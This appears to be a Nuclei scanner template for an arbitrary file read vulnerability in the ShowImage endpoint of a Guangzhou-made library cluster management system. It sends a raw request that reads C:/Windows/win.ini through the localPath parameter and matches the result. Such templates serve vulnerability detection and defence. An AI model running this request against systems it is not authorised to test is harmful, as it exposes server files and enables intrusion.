id: gxtctsgjq-ShowImage-fileread

info:
  name: gxtctsgjq-ShowImage-fileread
  author: HB
  severity: high
  description: 广州图创计算机软件开发公司图书馆集群管理系统ShowImage存在任意文件读取漏洞

http:
  - raw:
    - |
      GET /interlib/report/ShowImage?localPath=C:/Windows/win.ini HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Connection: close
      Cookie: JSESSIONID=CBBF7FA6988D795FEBB76E9C04529250
      Upgrade-Insecure-Requests: 1

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"fonts")'